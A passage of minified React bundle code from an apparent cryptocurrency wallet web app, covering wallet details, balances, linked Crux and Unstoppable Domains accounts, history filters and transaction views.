          , mR = "wallet-title_spamTokenInfo_3YbrG";
        function WalletTitle(e) {
            var t;
            let {wallet: a} = e;
            const [n,r] = (0,
            O.useState)(null)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(0)
              , [c,u] = (0,
            O.useState)(a.title)
              , d = (0,
            $.I0)()
              , m = (0,
            $.v9)(_s)
              , p = O.createRef()
              , f = null === (t = (0,
            be.II)(a.currency)) || void 0 === t ? void 0 : t.title
              , {isSpamToken: E, isUnknownToken: h} = useSpamAndUnknownToken(a)
              , g = (0,
            O.useMemo)(( () => !(!a.isNewWallet && !a.isNewToken)), [a])
              , y = (0,
            O.useMemo)(( () => !!a.uuid && m.indexOf(a.uuid) > -1), [a, m]);
            (0,
            O.useEffect)(( () => {
                u(a.title)
            }
            ), [null == a ? void 0 : a.title]);
            function handleChangeTitle(e) {
                let {target: {value: t}} = e;
                const a = (0,
                ve.Z)(t);
                u(a)
            }
            async function handleSave(e) {
                if (a.title !== c) {
                    a.title = c;
                    d(rd.updateWallet({
                        wallet: a
                    }))
                }
                r(null);
                s(!1);
                e && e.stopPropagation()
            }
            function handleStartEditable(e) {
                r(a);
                s(!0);
                e && e.stopPropagation()
            }
            (0,
            O.useEffect)(( () => {
                l && p.current && p.current.focus()
            }
            ), [l, p]);
            function handleOnKeyDown(e) {
                let {keyCode: t} = e;
                13 === t && handleSave();
                if (27 === t) {
                    r(null);
                    s(!1)
                }
            }
            function toggleVisibleWallet(e) {
                d(toggleVisibilityWallet(a));
                e.stopPropagation()
            }
            (0,
            O.useEffect)(( () => {
                const e = document.getElementById("hidden-text");
                o(null != e && e.clientWidth ? e.clientWidth : 0)
            }
            ), [c]);
            const v = i + 30;
            return O.createElement("div", {
                className: Ht()(nR, {
                    [dR]: y
                })
            }, l && n ? O.createElement("input", {
                ref: p,
                maxLength: 35,
                value: c,
                placeholder: f,
                onChange: handleChangeTitle,
                onKeyDown: handleOnKeyDown,
                onBlur: handleSave,
                className: oR,
                spellCheck: !1,
                style: {
                    width: i
                }
            }) : O.createElement("div", {
                className: cR,
                onClick: handleStartEditable
            }, c && c.trim().length ? c : f), O.createElement("div", {
                className: uR,
                id: "hidden-text"
            }, c && c.trim().length ? c : f), !g && O.createElement("div", {
                className: rR,
                style: {
                    left: v
                }
            }, O.createElement("span", {
                dangerouslySetInnerHTML: {
                    __html: aR()
                },
                className: lR,
                onClick: handleStartEditable
            }), O.createElement("span", {
                dangerouslySetInnerHTML: {
                    __html: y ? QW() : eR()
                },
                className: sR,
                onClick: toggleVisibleWallet
            })), a.family && (E ? O.createElement("span", {
                className: mR
            }, `This is a fake ${a.family.toUpperCase()} token`) : h && O.createElement("span", {
                className: mR
            }, `This is an unknown ${a.family.toUpperCase()} token`)))
        }
        const pR = "@crux"
          , fR = "@crux/addresses/SET_WALLETS"
          , ER = {}
          , hR = (0,
        Ru.Z)({
            [fR]: (e, t) => {
                let {wallets: a} = t;
                return {
                    ...e,
                    wallets: a,
                    isFetched: !0
                }
            }
        }, ER)
          , selectedAttachedWallets = e => e["@crux"].wallets || {}
          , selectedIsFetched = e => e["@crux"].isFetched || !1
          , fetchAttachedWallets = () => async e => {
            const t = await Se.Z.getApiByCurrency("crux")
              , a = await e(getSecureData(Qe));
            if (!a)
                return null;
            const n = await t.getPublicAddresses({
                privateKey: a.privateKey
            });
            await e({
                type: fR,
                wallets: n
            });
            return n
        }
        ;
        function WalletLinkedCruxAccount(e) {
            var t;
            let {wallet: a} = e;
            const n = (0,
            $.v9)(selectedAttachedWallets)
              , r = (0,
            $.v9)(selectedIsFetched)
              , [l,s] = (0,
            O.useState)(null)
              , i = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                async function fetchCruxAccount() {
                    const e = await i(getSecureData(Qe));
                    if (e) {
                        r || i(fetchAttachedWallets());
                        s(e.accountName)
                    }
                }
                fetchCruxAccount()
            }
            ), [i, r]);
            if (!a)
                return null;
            if (!n)
                return null;
            const o = undefined;
            return (null === (t = n[a.currency]) || void 0 === t ? void 0 : t.addressHash) === a.address && l ? O.createElement("div", {
                className: ZF.wrapper
            }, O.createElement("br", null), O.createElement("div", {
                className: ZF.titleBlock
            }, "Crux ID:"), O.createElement("div", {
                className: ZF.contentBlock
            }, O.createElement(button_copy, null, (e => e ? "Copied" : `${l}@guarda.crux`)))) : null
        }
        const gR = "@ud/addresses"
          , yR = "@ud/addresses/SET_WALLETS"
          , vR = {}
          , _R = (0,
        Ru.Z)({
            [yR]: (e, t) => {
                let {wallets: a} = t;
                return {
                    ...e,
                    wallets: a,
                    isFetched: !0
                }
            }
        }, vR)
          , ud_addresses_selectedAttachedWallets = e => e["@ud/addresses"].wallets || []
          , ud_addresses_fetchAttachedWallets = () => async e => {
            const t = await e(getSecureData(Je));
            if (!t)
                return null;
            const {data: a} = await Jf().get(`https://unstoppabledomains.com/api/v1/${t.domainName}`)
              , n = Object.keys(a.addresses).reduce(( (e, t) => {
                e.push({
                    currency: t,
                    address: a.addresses[t]
                });
                return e
            }
            ), []);
            e({
                type: yR,
                wallets: n
            });
            return n
        }
        ;
        function eqString(e, t) {
            return (0,
            Ho.t)(e) === (0,
            Ho.t)(t)
        }
        function WalletLinkedUdAccount(e) {
            let {wallet: t} = e;
            const a = (0,
            $.v9)(ud_addresses_selectedAttachedWallets)
              , [n,r] = (0,
            O.useState)(null)
              , l = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                async function fetchCruxAccount() {
                    if (!n) {
                        const e = await l(getSecureData(Je));
                        if (!e)
                            return;
                        l(ud_addresses_fetchAttachedWallets());
                        const {domainName: t} = e;
                        r(t)
                    }
                }
                fetchCruxAccount()
            }
            ), [n, l]);
            if (!t)
                return null;
            if (!a.length)
                return null;
            const s = undefined;
            return a.find((e => eqString(e.address, t.address) && eqString(e.currency, t.currency))) && n ? O.createElement("div", {
                className: ZF.wrapper
            }, O.createElement("br", null), O.createElement("div", {
                className: ZF.titleBlock
            }, "Unstoppable domain:"), O.createElement("div", {
                className: ZF.contentBlock
            }, O.createElement(button_copy, {
                text: n
            }, (e => e ? "Copied" : n)))) : null
        }
        const wR = {
            buttonAction: "wallet-multisigs_buttonAction_x7mpp styles_dashedNormal_xEvl8",
            publicKey: "wallet-multisigs_publicKey_25JYC"
        };
        function wallet_multisigs_WalletMultisigs(e) {
            let {wallet: t} = e;
            return t && null != t && t.multisigId ? O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("div", {
                className: wR.wrapper
            }, "Participants. Minimum signatures to spend:", " ", O.createElement("b", null, null == t ? void 0 : t.minimumSigAmount, " of ", null == t ? void 0 : t.participants.length), O.createElement("br", null), O.createElement("br", null), null == t ? void 0 : t.participants.map((e => O.createElement(button_copy, {
                text: e.data,
                className: wR.publicKey,
                key: e.data
            }, (t => t ? "Copied to clipboard" : formatAddress(e.data, 20))))))) : null
        }
        function wallet_information_block_WalletInformationBlock(e) {
            var t, a, n, r;
            let {wallet: l, newCoinOrToken: s, isTokenAvailableForBuy: i, activeWallet: o, params: c, setNewCoinOrToken: u, buySupportedCurrencies: d} = e;
            const m = (0,
            $.I0)()
              , p = (0,
            $.v9)(Kc)(null !== (t = l.uuid) && void 0 !== t ? t : "") || l.balance
              , f = (0,
            $.v9)($c)
              , [E,h] = (0,
            O.useState)(!1)
              , [g,y] = (0,
            O.useState)(!1)
              , [v,_] = (0,
            O.useState)(null)
              , [w,b] = (0,
            O.useState)(!l.watchOnly)
              , [k,S] = (0,
            O.useState)(!1)
              , C = (0,
            O.useRef)(!0)
              , N = l.accountName || l.address || ""
              , T = (0,
            be.Au)(l.family, l.currency, N)
              , {convertToFiat: A} = useConverter()
              , {handleGo: x} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            });
            (0,
            O.useEffect)(( () => {
                var e;
                l && l.type === we.uQ.BTC_LIKE_SEGWIT_WALLET && (null == l ? void 0 : l.hw) === we.Vw.LEDGER && null != l && null !== (e = l.subWallets) && void 0 !== e && e.length ? y(!0) : y(!1)
            }
            ), [l, l.type]);
            (0,
            O.useEffect)(( () => {
                b(!l.watchOnly)
            }
            ), [l.address]);
            (0,
            O.useEffect)(( () => {
                if (C.current)
                    C.current = !1;
                else {
                    S(!0);
                    setTimeout(( () => S(!1)), 300)
                }
            }
            ), [null == o ? void 0 : o.uuid]);
            const I = (0,
            O.useContext)(Vt);
            function handleShowAddress() {
                b(!0)
            }
            function openReceiveAsaPopup() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                I.open("create-asa-tokens", {
                    wallet: l,
                    ...e
                })
            }
            async function handleGenerateAddress() {
                if ("algo" === (null == l ? void 0 : l.family))
                    return openReceiveAsaPopup({
                        wallet: v,
                        assetWallet: l
                    });
                if (s) {
                    if ("hbar" === s.currency) {
                        const e = {
                            initialTab: "create",
                            currency: "hbar",
                            withoutMenu: !0,
                            isForceCreate: !1
                        };
                        return I.open("import-or-create", e)
                    }
                    if ("eos" === s.currency)
                        return I.open("create-eos");
                    m(rd.createWallet({
                        currency: s.currency,
                        smartContract: s.smartContract,
                        parentWallet: v,
                        downloadType: Sm.FORCE,
                        isCoin: !(null == s || !s.isNewWallet) && "true" === (null == s ? void 0 : s.isNewWallet),
                        setNewCoinOrToken: u
                    }))
                }
            }
            const isTrxSubWallet = e => !("eth" !== e.currency && "btc" !== e.currency || e.type !== we.aO.OVERALL_SUBWALLET && !e.isNewToken) || ("hbar" === e.family || "hbar-testnet" === e.family) && e.type === we.aO.OVERALL_SUBWALLET && !i
              , showBalance = () => {
                var e;
                return (null === (e = Se.Z.getRootMetadata(l.currency)) || void 0 === e ? void 0 : e.coin.features.isActiveBalance) || (null == c ? void 0 : c.isSubWallet) || (null == l ? void 0 : l.isSubWallet) || (null == c ? void 0 : c.isNewToken) || (null == c ? void 0 : c.isNewWallet)
            }
              , P = (0,
            $.v9)(Ac.bq)
              , L = (0,
            O.useMemo)(( () => {
                var e, t;
                return !(null == l || !l.uuid) && (null === (e = P[l.uuid]) || void 0 === e || null === (t = e.balance) || void 0 === t ? void 0 : t.apiStatus) === Ac.rA.Rejected
            }
            ), [null == l ? void 0 : l.uuid, P]);
            return O.createElement("div", null, O.createElement("div", {
                className: ZF.wrapperWallets
            }, O.createElement(WalletTitle, {
                wallet: l
            }), !s && O.createElement(extra_menu_ExtraMenu, {
                wallet: l
            })), O.createElement("div", {
                className: ZF.wrapperBlocks
            }, w && !s && O.createElement(qr_code, {
                size: 154,
                value: N,
                className: Ht()({
                    [ZF.blink]: k
                })
            }), !w && O.createElement("div", {
                className: ZF.fakeQRcode,
                onClick: handleShowAddress
            }, "Show address"), s && O.createElement("div", {
                className: ZF.fakeQRcode,
                onClick: handleGenerateAddress
            }, "Generate address"), O.createElement("div", {
                className: ZF.wallerWrapper
            }, !s && O.createElement(O.Fragment, null, O.createElement(EthLinkInformation, {
                wallet: l
            }), O.createElement(HbarLinkInformation, {
                wallet: l
            }, !(null != l && l.currency.endsWith("-testnet")) && O.createElement(O.Fragment, null, " or ", O.createElement(Y.OL, {
                to: "/app/token-generator?tokenType=hbar_hbar"
            }, "Create token")))), showBalance() && O.createElement("div", {
                className: ZF.walletInfoContainer
            }, O.createElement("div", {
                className: ZF.walletInfo
            }, O.createElement("div", {
                className: ZF.titleBlock
            }, "Wallet balance", "eos" === l.currency ? " (unstaked)" : null, ":"), O.createElement("div", {
                className: ZF.contentBlock
            }, O.createElement(button_copy, {
                text: p,
                className: Ht()(ZF.addressText, L && ZF.error)
            }, (e => e ? "Balance copied to clipboard" : `${(0,
            Ko.yF)(p)} ${(0,
            be.xG)(l.currency)}`)), O.createElement(UpdateBalance, {
                wallet: l,
                immediately: !0
            })), O.createElement("div", {
                className: Ht()(ZF.fiatAmount, ZF.userSelect)
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: A(p, l),
                full: !0,
                renderCurrency: !0
            }))), "algo" === l.currency && !l.watchOnly && O.createElement("div", {
                className: ZF.extraButtonWrapper
            }, O.createElement(MiskInfoValue, {
                onClick: openReceiveAsaPopup
            }, "Receive supported ASA tokens")) || null), O.createElement("div", {
                className: ZF.walletInfoContainer
            }, O.createElement("div", {
                className: ZF.walletInfo
            }, (l.address || s) && O.createElement("div", null, O.createElement("div", {
                className: Ht()(ZF.titleBlock, ZF.titleBlockAddress)
            }, O.createElement(wallet_address_WalletAddress, {
                wallet: l
            }), (null == s ? void 0 : s.isNewToken) && O.createElement(NewTokenParentAddress, {
                newCoinOrToken: s,
                parentWalletForNewToken: v,
                wallets: f,
                handleSetParentWalletForNewToken: e => _(e)
            })), O.createElement("div", {
                className: Ht()(ZF.contentBlock, {
                    [ZF.doubleLine]: N.length > 55 || (0,
                    M.d)()
                })
            }, s ? O.createElement(NewCoinOrTokenGenerateAddress, {
                handleGenerateAddress
            }) : O.createElement(O.Fragment, null, w && O.createElement(button_copy, {
                text: N,
                className: Ht()(ZF.addressText, ZF.inline)
            }, (e => e ? "Address copied to clipboard" : N)), !w && O.createElement("span", {
                className: ZF.addressText,
                onClick: handleShowAddress
            }, N.replace(/./g, "*")), T && w && O.createElement("a", {
                href: T,
                target: "_blank",
                rel: "noreferrer noopener",
                className: ZF.iconExplorer
            }, O.createElement(VA, {
                src: Bp,
                alt: "Open in explorer"
            })), " "))), (l.publicKey || l.accountName) && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("div", {
                className: ZF.titleBlock
            }, "Public Key:"), O.createElement("div", {
                className: Ht()(ZF.contentBlock, {
                    [ZF.doubleLine]: l.publicKey && (null == l ? void 0 : l.publicKey.length) > 60 && !(0,
                    M.d)()
                })
            }, O.createElement(button_copy, {
                text: l.publicKey || l.address,
                className: ZF.addressText
            }, (e => e ? "Public Key copied to clipboard" : l.publicKey || l.address)))), l.smartContract && M.CM && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("div", {
                className: ZF.titleBlock
            }, "Smart Contract:"), O.createElement("div", {
                className: ZF.contentBlock
            }, O.createElement(button_copy, {
                text: l.smartContract,
                className: ZF.addressText
            }, (e => e ? "Smart Contract copied to clipboard" : l.smartContract)))), !s && O.createElement(O.Fragment, null, O.createElement(WalletLinkedFioAccount, {
                wallet: l
            }), O.createElement(WalletLinkedCruxAccount, {
                wallet: l
            }), O.createElement(WalletLinkedUdAccount, {
                wallet: l
            }), w && O.createElement(qW, {
                wallet: l
            }), w && O.createElement(wallet_multisigs_WalletMultisigs, {
                wallet: l
            })), g && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("span", {
                className: ZF.likeLink,
                onClick: () => h((e => !e))
            }, E ? "Hide" : "Show", " HD addresses"), E && O.createElement(HDAddressPanel, {
                wallet: l,
                isReceive: !0
            })))), !l.watchOnly && O.createElement("div", {
                className: ZF.walletInfoContainer
            }, !1 !== (null === (a = Se.Z.getRootMetadata(l.currency)) || void 0 === a ? void 0 : a.coin.features.isActiveSend) && O.createElement(Yl, {
                color: "light-blue",
                className: ZF.buttonSend,
                onClick: x({
                    path: (0,
                    M.RU)("/send"),
                    wallet: l,
                    isNewToken: Boolean(null == s ? void 0 : s.isNewToken),
                    isNewWallet: Boolean(null == s ? void 0 : s.isNewWallet),
                    parentWallet: v,
                    fromWallet: !0
                })
            }, "Send"), !1 !== (null === (n = Se.Z.getRootMetadata(l.currency)) || void 0 === n ? void 0 : n.coin.features.isActiveSend) && !l.isSubWallet && !s && O.createElement(FioRequestButton, {
                wallet: l
            }), !1 !== (null === (r = Se.Z.getRootMetadata(l.currency)) || void 0 === r ? void 0 : r.coin.features.isActiveExchange) && !isTrxSubWallet(l) && !l.isTestnet && O.createElement(Yl, {
                color: "blue",
                className: ZF.buttonSend,
                onClick: x({
                    path: (0,
                    M.RU)("/exchange"),
                    wallet: l,
                    isNewToken: Boolean(null == s ? void 0 : s.isNewToken),
                    isNewWallet: Boolean(null == s ? void 0 : s.isNewWallet),
                    parentWallet: v,
                    fromWallet: !0
                })
            }, "Exchange"), ((null == d ? void 0 : d.includes(l.currency)) || i) && !isTrxSubWallet(l) && O.createElement(Yl, {
                id: "buyOpenReceive",
                color: "blue",
                onClick: x({
                    path: (0,
                    M.RU)("/buy"),
                    wallet: l,
                    isNewToken: Boolean(null == s ? void 0 : s.isNewToken),
                    isNewWallet: Boolean(null == s ? void 0 : s.isNewWallet),
                    parentWallet: v,
                    fromWallet: !1
                })
            }, "Buy")))))
        }
        const bR = wallet_information_block_WalletInformationBlock
          , kR = "refresh-button_refreshButton_3km5e"
          , SR = "refresh-button_refreshButtonElectron_3u-Gu"
          , CR = "refresh-button_animated_1jTt1"
          , NR = "refresh-button_spin_1UTfH";
        var TR = a(34531)
          , AR = a.n(TR);
        function RefreshButton(e) {
            const {isLoading: t, handleUpdate: a, right: n, className: r} = e;
            let l = 30;
            n && (l = n);
            return O.createElement(O.Fragment, null, t ? O.createElement("div", {
                className: Ht()(r || "", {
                    [SR]: (0,
                    M.d)()
                }, {
                    [kR]: !(0,
                    M.d)()
                }, {
                    [CR]: t
                }),
                style: {
                    right: l
                }
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: AR()
                }
            })) : O.createElement("div", {
                className: Ht()({
                    [SR]: (0,
                    M.d)()
                }, {
                    [kR]: !(0,
                    M.d)()
                }, r || ""),
                style: {
                    right: l
                },
                onClick: a
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: AR()
                }
            })))
        }
        const xR = RefreshButton
          , IR = "filter_wrapper_vgC1y"
          , PR = "filter_sectionSearch_1PS6Z"
          , LR = "filter_sectionType_3K4xi"
          , FR = "filter_wrapperToggler_3TS7X"
          , WR = "filter_inputSearch_uzALR"
          , RR = "filter_value_2gm6x"
          , BR = "filter_type_1X8_J"
          , OR = "filter_wrapperList_1HJpI"
          , DR = "filter_listItem_3b2LC"
          , MR = "filter_noBorders_34nY2"
          , UR = "filter_listSubItem_lnqbV"
          , GR = "filter_multisigInfo_dHtK8"
          , VR = "filter_listWallets_2ibgb"
          , KR = "filter_inputSearchWallets_2Qjix"
          , HR = "filter_empty_2L2nC"
          , zR = "filter_emptyList_gjcNs"
          , jR = {
            all: "All types",
            received: "Received",
            send: "Send",
            exchange: "Exchange",
            buy: "Buy",
            multisig: "Multisigs"
        };
        function typedKeys(e) {
            return Object.keys(e)
        }
        const $R = O.forwardRef(( (e, t) => {
            const {setTxType: a, prepareTypesPlaceholder: n} = e
              , enterHandler = e => {
                a(e.dataset.typeId)
            }
              , {arrowNavigation: r, listRef: l} = es({
                enterHandler,
                noScrolling: !0
            });
            return O.createElement(O.Fragment, null, O.createElement("input", {
                autoFocus: !0,
                onKeyDown: r,
                style: {
                    opacity: 0
                },
                ref: t
            }), O.createElement("div", {
                className: OR,
                ref: l
            }, typedKeys(jR).map((e => O.createElement("div", {
                className: DR,
                onClick: () => a(e),
                "data-type-id": e,
                key: `search-butype${e}`
            }, n(e))))))
        }
        ))
          , ZR = $R;
        let YR;
        function BoardHistoryFilter(e) {
            let {onFilterAccept: t, filterForOneWallet: a, oneWallet: n} = e;
            const [r,l] = (0,
            O.useState)("")
              , [s,i] = (0,
            O.useState)("")
              , [o,c] = (0,
            O.useState)("all")
              , [u,d] = (0,
            O.useState)(null)
              , [m,p] = (0,
            O.useState)(!1)
              , [f,E] = (0,
            O.useState)(!1)
              , h = (0,
            $.I0)()
              , g = (0,
            $.v9)($c)
              , y = useSortWallets();
            (0,
            O.useEffect)(( () => {
                window.clearTimeout(YR);
                YR = window.setTimeout(( () => {
                    const e = undefined;
                    null == t || t({
                        text: r,
                        type: o,
                        wallet: a ? n : u
                    });
                    return () => window.clearTimeout(YR)
                }
                ), 100)
            }
            ), [u, o, r, t, n]);
            (0,
            O.useEffect)(( () => {
                p(!1);
                E(!1)
            }
            ), [u, o]);
            (0,
            O.useEffect)(( () => {
                !f && s && i("")
            }
            ), [f, m, s]);
            function prepareTypesPlaceholder(e) {
                return "all" === e ? O_ ? "All types" : "All" : jR[e]
            }
            const handleChange = e => {
                d(e);
                h(setActiveWallet(e))
            }
            ;
            let v = y({
                wallets: g
            }).filter((e => {
                var t;
                return null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t ? void 0 : t.coin.features.isActiveTransactions
            }
            ));
            v = filterWallets(v, s);
            const _ = O_ ? "All wallets" : "All";
            return O.createElement("div", {
                className: IR
            }, !a && O.createElement("div", {
                className: LR
            }, O.createElement("div", {
                className: FR,
                onClick: () => E(!0)
            }, !O_ && O.createElement("div", {
                className: BR
            }, "Wallet:"), O.createElement("span", {
                className: RR
            }, u ? u.title : _)), O.createElement(Xl(), {
                visible: f,
                onClose: () => E(!1)
            }, O.createElement("div", {
                className: Ht()(OR, VR)
            }, O.createElement("div", {
                className: DR,
                onClick: () => d(null)
            }, O.createElement("span", {
                className: zR
            }, "All wallets")), O.createElement(InputWalletsList, {
                withMultisigs: !0,
                wallets: v,
                onChange: handleChange
            })))), O.createElement("div", {
                className: LR,
                onClick: () => p(!0)
            }, !O_ && O.createElement("div", {
                className: BR
            }, "Type:"), O.createElement("span", {
                className: RR
            }, prepareTypesPlaceholder(o)), O.createElement(Xl(), {
                visible: m,
                onClose: () => p(!1)
            }, O.createElement(ZR, {
                setTxType: c,
                prepareTypesPlaceholder
            }))), O.createElement("div", {
                className: PR
            }, O.createElement("input", {
                onChange: e => {
                    let {target: {value: t}} = e;
                    return l(t)
                }
                ,
                value: r,
                className: WR,
                placeholder: "Search by hash, address",
                type: "text"
            })))
        }
        const watch_only = e => {
            const t = (0,
            $.v9)(Jc);
            return t.indexOf((0,
            Ho.t)(e.addressFrom)) > -1 || t.indexOf((0,
            Ho.t)(e.addressTo)) > -1 || t.indexOf((0,
            Ho.t)(e.address)) > -1
        }
          , hw_address = e => {
            const t = (0,
            $.v9)(Qc);
            return t.indexOf((0,
            Ho.t)(e.addressFrom)) > -1 || t.indexOf((0,
            Ho.t)(e.addressTo)) > -1
        }
          , qR = {
            txBlock: "transaction-item_txBlock_1F7qZ",
            black: "transaction-item_black_2Xl3X",
            yellow: "transaction-item_yellow_1IIwZ",
            txLine: "transaction-item_txLine_1DGRC",
            txDetails: "transaction-item_txDetails_2i9z3",
            failedTxActions: "transaction-item_failedTxActions_oKSVI",
            fullWidth: "transaction-item_fullWidth_1luug",
            txDetailLine: "transaction-item_txDetailLine_3L1ZV",
            userSelect: "transaction-item_userSelect_1q_Pu",
            txExtraAmount: "transaction-item_txExtraAmount__VTQV",
            extraLabel: "transaction-item_extraLabel_LKpmi",
            isVisibleDetails: "transaction-item_isVisibleDetails_2QhPt",
            txDate: "transaction-item_txDate_3Jxjk",
            txInlineHash: "transaction-item_txInlineHash_1AYej",
            txAmount: "transaction-item_txAmount_3le1E",
            error: "transaction-item_error_1LxZD",
            success: "transaction-item_success_KcEP9",
            isIncoming: "transaction-item_isIncoming_147Bg",
            isPending: "transaction-item_isPending_1gBIl",
            currencyFamily: "transaction-item_currencyFamily_1EXKq",
            tooltip: "transaction-item_tooltip_2ZYLR",
            buttonCopy: "transaction-item_buttonCopy_1eeXQ styles_dashedNormal_xEvl8",
            detailsStatus: "transaction-item_detailsStatus_3n9n7",
            hashBlock: "transaction-item_hashBlock_CQGz7",
            outcomingExchange: "transaction-item_outcomingExchange_2NGPj",
            "exchange-waiting": "transaction-item_exchange-waiting_3zMf5",
            incomingExchange: "transaction-item_incomingExchange_STC-6",
            "exchange-sending": "transaction-item_exchange-sending_mWE38",
            "exchange-exchanging": "transaction-item_exchange-exchanging_1ISN5",
            "exchange-confirming": "transaction-item_exchange-confirming_3yxVw",
            "exchange-refunded": "transaction-item_exchange-refunded_3L995",
            currencyTicker: "transaction-item_currencyTicker_2JDfW",
            devLine: "transaction-item_devLine_1KmmW",
            italicLabel: "transaction-item_italicLabel_3FeBV",
            stringify: "transaction-item_stringify_1SfZX",
            footerMultisigButtons: "transaction-item_footerMultisigButtons_20rgV",
            multisigTxAmount: "transaction-item_multisigTxAmount_1OexM",
            footerButtons: "transaction-item_footerButtons_2dik3",
            woMark: "transaction-item_woMark_34yXo",
            exchangeFailedBlock: "transaction-item_exchangeFailedBlock_2edNk",
            loaderText: "transaction-item_loaderText_aHguc"
        }
          , BuyStatusText = e => {
            let {status: t} = e
              , a = "";
            if (t) {
                var n;
                a = null !== (n = {
                    [nc.WATING_YOUR_DEPOSIT]: "We are waiting for your deposit",
                    [nc.WATING_YOUR_KYC]: "Kindly proceed with the KYC (click Continue)",
                    [nc.WATING_BANK_EXCHANGING]: "Transaction accepted by bank. Exchanging funds",
                    [nc.WATING_BANK_SENDING]: "Sending funds to your wallet",
                    [nc.REQUEST_SUBMITTED]: "Payment request submitted",
                    [nc.BANK_ACCEPTED]: "Transaction accepted by bank. Sending funds to your wallet",
                    [nc.FINISHED]: "Finished",
                    [nc.FAILED]: "Transaction failed. Kindly contact support for details",
                    [nc.CANCELED]: "Transaction canceled. Kindly contact support for details",
                    [nc.EXPIRED]: "Order expired as we have not receive your deposit. Kindly start a new purchase",
                    [nc.REFUNDED]: "Refunded. Kindly contact support for any details"
                }[t]) && void 0 !== n ? n : a
            }
            return O.createElement(O.Fragment, null, a)
        }
        ;
        function TxBuyView(e) {
            var t;
            let {tx: a} = e;
            const {convertToFiat: n, isAvailableRate: r} = useConverter()
              , l = getSimpleWalletObjectBuyTo(a)
              , s = r(l) ? n(null !== (t = a.amountTo) && void 0 !== t ? t : "0", l) : null;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: Ht()(qR.detailsStatus)
            }, O.createElement(BuyStatusText, {
                status: toBuyStatus(a.extra ? a.extra.status : void 0)
            }))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Purchased"), O.createElement("div", {
                className: qR.userSelect
            }, a.amountTo, " ", (0,
            be.wL)((0,
            be.xG)(a.currencyTo)), s && O.createElement(O.Fragment, null, " ", "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: s,
                renderCurrency: !0
            })))), a.extra && !!a.extra.amountFrom && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Spent"), O.createElement("div", {
                className: qR.userSelect
            }, "-", a.extra.amountFrom, " ", (0,
            be.wL)((0,
            be.xG)(a.extra.currencyFrom)))))
        }
        function TxExchnageView(e) {
            let {tx: t} = e;
            const {convertToFiat: a, isAvailableRate: n} = useConverter()
              , r = getSimpleWalletObject(t)
              , l = n(r) ? a(t.amount, r) : null;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: Ht()(qR.detailsStatus)
            }, t.extra.status)), t.exchangeId && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Exchange ID"), O.createElement("div", null, t.exchangeId, " ", O.createElement(button_copy, {
                text: t.exchangeId,
                className: qR.buttonCopy
            }))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Amount"), O.createElement("div", {
                className: qR.userSelect
            }, t.isIncoming ? "+" : "-", t.amount, " ", (0,
            be.wL)((0,
            be.xG)(t.currencyFrom)), l && O.createElement(O.Fragment, null, " ", "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: l,
                renderCurrency: !0
            })))))
        }
        const XR = ["zec", "btc", "kmd", "hbar"]
          , validateFee = e => ("string" != typeof e || null == e || !e.startsWith("0x")) && !Number.isNaN(parseFloat(String(e)));
        function ViewAmountTop(e) {
            var t, a, n, r;
            let {tx: l} = e;
            const s = isExchange(l)
              , i = isSell(l)
              , [o,c] = (0,
            O.useState)(!0)
              , {amount: u, fee: d} = l
              , m = l.family && l.family !== l.currencyTo
              , p = !Number.isNaN(parseFloat(String(u))) && !!l.amount
              , f = validateFee(d)
              , E = !m && !l.isIncoming && !XR.includes((null == l || null === (t = l.currencyFrom) || void 0 === t ? void 0 : t.toLowerCase()) || "")
              , h = E && f ? (0,
            Ko.PD)(u, d) : u;
            let g = p ? (0,
            Ko.i1)(h, 8) : "";
            const y = null !== (a = l.states) && void 0 !== a ? a : []
              , v = l.extra;
            (0,
            O.useEffect)(( () => {
                if (isMultisigTxs(l)) {
                    var e;
                    const t = null === (e = y.find((e => e.transactionHash))) || void 0 === e ? void 0 : e.transactionHash;
                    t && Se.Z.getApiByMultisigTransaction(l).then((e => {
                        null == e || e.isTransactionMined(t).then((e => {
                            c(!e)
                        }
                        ))
                    }
                    ))
                }
            }
            ), [l]);
            isKmdClaim(l) && v && (g = (0,
            Ko.i1)(v.claimAmount, 8));
            if (isAtomUndelegate(l))
                return O.createElement(O.Fragment, null, "+", g, " ", O.createElement("span", {
                    className: qR.currencyTicker
                }, "ATOM"));
            isKmdClaim(l) && v && (g = (0,
            Ko.i1)(v.claimAmount, 8));
            if (isTrxClaiming(l) || isGethDeposit(l))
                return O.createElement("span", {
                    className: qR.success
                }, "+", g, " ", O.createElement("span", {
                    className: qR.currencyTicker
                }, (0,
                be.wL)((0,
                be.xG)(l.currencyFrom))), !!l.family && l.currencyFrom !== l.family && O.createElement("span", {
                    className: qR.currencyFamily
                }, l.family));
            if (isEthStaking(l))
                return O.createElement("span", null, "-", g, " ", O.createElement("span", {
                    className: qR.currencyTicker
                }, (0,
                be.wL)((0,
                be.xG)(l.family))));
            if (isMultisig(l))
                return null;
            if (isMultisigTxs(l))
                return O.createElement("span", {
                    className: Ht()({
                        [qR.multisigTxAmount]: o
                    })
                }, g, " ", (0,
                be.wL)((0,
                be.xG)(l.currencyTx)));
            if (isFio(l))
                return O.createElement("span", {
                    className: Ht()({
                        [qR.success]: "fio-appruved" === l.type && !l.isIncoming,
